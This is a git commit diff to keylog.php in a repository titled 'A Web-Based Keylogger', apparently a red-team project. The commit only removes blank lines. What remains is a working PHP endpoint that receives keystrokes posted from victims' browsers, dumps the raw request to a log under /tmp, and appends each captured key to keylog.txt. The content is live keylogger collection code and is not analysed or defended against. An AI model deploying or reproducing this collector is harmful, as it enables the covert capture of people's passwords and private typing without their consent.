9c5a5eba181e5e6f34b7f20e08dd85617791c705
RedTeamer <150991629+KishoreDasarathan@users.noreply.github.com>
2024-04-11 20:58:51 +0530

    Update keylog.php

--- A Web-Based Keylogger/keylog.php
+++ A Web-Based Keylogger/keylog.php
@@ -1,19 +1,13 @@
 <?php
-
 file_put_contents('/tmp/ngroktest.log',json_encode($_POST));
-
 $file = fopen("keylog.txt","a+");
 
 //save keystrokes
-
 $keys = json_decode($_POST['keys']);
 
 foreach ($keys as $k=>$v){
     fwrite($file,$v . PHP_EOL);
 }
-
 fclose($file);
-
 echo "OK";
-
 ?>
